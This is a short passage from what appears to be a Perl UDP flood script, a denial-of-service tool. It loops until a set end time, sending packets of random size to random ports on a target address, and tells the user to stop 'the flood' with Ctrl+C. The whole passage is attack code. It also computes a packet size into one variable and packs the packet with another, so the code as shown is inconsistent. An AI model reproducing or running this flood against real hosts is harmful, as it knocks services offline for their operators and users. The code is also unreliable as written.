print "Stop the flood with: Ctrl+C\n";

for (;time() <= $endtime;){
        $rsize = $size ? $size : int(rand(1024-64)+64);
        $rport = $port ? $port : int(rand(65500))+1;

        send(flood, pack("a$psize",""), 0, pack_sockaddr_in($rport, $iaddr));

}
